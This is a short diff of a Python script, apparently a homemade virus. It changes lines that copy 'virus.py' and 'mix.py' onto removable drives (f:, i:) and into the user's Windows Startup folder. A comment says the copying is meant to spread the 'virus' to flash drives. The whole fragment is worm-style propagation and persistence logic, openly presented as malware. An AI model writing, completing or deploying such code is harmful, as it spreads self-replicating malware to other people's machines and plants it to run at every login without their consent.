@@ -23,8 +23,8 @@ while True:
     elif pwd == 'I:\\':   #2
         timer +=2
         try:
-            #cp_virus = shutil.copy('virus.py','f:')
-            #cp_mix = shutil.copy('mix.py','f:')
+            cp_virus = shutil.copy('virus.py','f:')
+            cp_mix = shutil.copy('mix.py','f:')
             cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
             print('run 2')
         except:
@@ -32,10 +32,9 @@ while True:
             pass
 
      #3   
-    elif pwd == ('C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user):
-        timer +=4
+    elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user:
         try:
-            cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
+            #cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
             cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
             print('run 3')
         except:
